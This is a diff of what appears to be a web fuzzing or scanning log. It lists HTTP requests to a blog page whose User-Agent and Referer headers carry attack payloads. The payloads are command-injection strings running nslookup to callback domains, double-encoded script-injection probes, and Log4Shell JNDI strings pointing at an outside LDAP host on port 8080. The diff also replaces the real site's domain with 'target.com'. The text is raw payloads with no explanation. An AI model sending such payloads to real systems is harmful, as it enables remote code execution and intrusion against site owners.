@@ -1,21 +1,3 @@
 
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
+[*] URL: https://www.target.com/blog/gift-card-scams/?utm_source=FUZZ
  | User-Agent:a;nslookup%20bnslkupH32c8297654771.;
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | referer:a;nslookup%20bnslkupH32c8297654771.;
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | User-Agent:%253cvijji%253e%2522%2522<vijji>%22%22
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | referer:%253cvijji%253e%2522%2522<vijji>%22%22
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | User-Agent:%253cvijji%253e%2522%2522<vijji>%22%22
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | User-Agent:a;nslookup%20bnslkupH33c8297654771.;
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | User-Agent:${jndi:ldap://byl4j33c8297654771.:8080/vijji4j}
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | referer:%253cvijji%253e%2522%2522<vijji>%22%22
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | referer:a;nslookup%20bnslkupH33c8297654771.;
-[*] URL: https://www.graphus.ai/blog/gift-card-scams/?utm_source=FUZZ
- | referer:${jndi:ldap://byl4j33c8297654771.:8080/vijji4j}
